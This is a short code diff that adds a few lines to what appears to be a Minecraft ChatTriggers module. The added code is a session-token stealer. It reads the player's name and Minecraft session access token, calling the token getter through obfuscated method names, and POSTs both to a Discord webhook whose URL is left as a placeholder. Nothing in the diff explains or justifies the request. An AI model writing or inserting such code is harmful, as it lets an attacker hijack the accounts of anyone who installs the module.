@@ -1,0 +1,9 @@
+import request from "../requestV2";
+request({
+    url: "place discord webhook here",
+    method: "POST",
+    headers: {"User-agent":"Mozilla/5.0"},
+    body: {content: "
+" + Player.getName() + " " + Client.getMinecraft().func_110432_I().func_148254_d() + "
+",}
+});
